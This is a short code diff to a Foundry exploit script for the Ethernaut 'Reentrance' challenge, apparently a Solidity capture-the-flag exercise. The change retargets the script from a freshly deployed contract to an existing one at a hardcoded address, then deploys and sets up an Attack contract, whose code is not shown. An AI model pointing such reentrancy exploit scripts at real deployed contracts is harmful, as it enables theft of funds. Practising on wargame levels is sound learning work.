@@ -6,7 +6,7 @@ import {Reentrance} from "../../src/Ethernaut/Reentrance.sol";
 contract ExploitScript is Script {
     function run() public {
         vm.startBroadcast();
-        Reentrance reentrance = new Reentrance();
+        Reentrance reentrance = Reentrance(0x677Af05a9d07e1A0a0C6e729012976A6Ccb65251);
         Attack attack = new Attack(payable(address(reentrance)));
         attack.setup();
         vm.stopBroadcast();
